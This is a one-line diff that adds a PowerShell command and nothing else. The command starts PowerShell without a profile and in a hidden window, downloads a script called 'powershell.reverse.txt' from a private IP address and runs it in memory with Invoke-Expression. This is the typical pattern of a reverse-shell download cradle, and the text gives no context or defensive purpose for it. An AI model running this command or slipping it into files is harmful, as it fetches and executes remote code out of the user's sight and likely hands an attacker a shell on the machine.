@@ -1,0 +1,1 @@
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://192.168.45.211:80/powershell.reverse.txt')"
